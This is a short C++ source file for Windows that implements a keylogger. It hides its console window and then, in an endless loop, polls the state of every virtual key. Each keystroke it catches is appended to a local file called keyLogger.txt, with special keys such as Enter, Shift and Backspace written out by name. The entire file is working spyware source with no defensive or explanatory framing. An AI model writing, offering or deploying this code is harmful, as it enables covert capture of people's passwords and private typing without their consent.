#include <Windows.h>
#include <fstream>
#include <conio.h>

// max and min virtual keys codes
#define MIN_VR_CODE 0 
#define MAX_VR_CODE 254

void createBackgroundProcess(void);

void saveToFile(int);

int main(int argc, char** argv) {
	createBackgroundProcess();

	while (true) {
		for (int i = MIN_VR_CODE; i <= MAX_VR_CODE; i++) {
			if (GetAsyncKeyState(i) & 0x01) { // checks is the least significant bit is set
				saveToFile(i);
			}
		}
	}
	return 0;
}

void createBackgroundProcess(void) {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void saveToFile(int key) {
	std::ofstream out("keyLogger.txt", std::ios::out | std::ios::app);

	// interval of mouse keys
	if (key >= 1 && key <= 6) {
		return;
	}

	switch (key) {
	case VK_BACK:
		out << "Backspace";
		break;
	case VK_TAB:
		out << "Tab";
		break;
	case VK_CLEAR:
		out << "ClearKey";
		break;
	case VK_RETURN:
		out << "Enter";
		break;
	case VK_SHIFT:
		out << "Shift";
		break;
	case VK_CONTROL:
		out << "Ctrl";
		break;
	case VK_MENU:
		out << "Alt";
		break;
	case VK_CAPITAL:
		out << "CapsLock";
		break;
	case VK_ESCAPE:
		out << "Esc";
		break;
	case VK_PAUSE:
		out << "Pause";
		break;
	default:
		out << (char)std::tolower(key);
		break;
	}
	out.close();
}
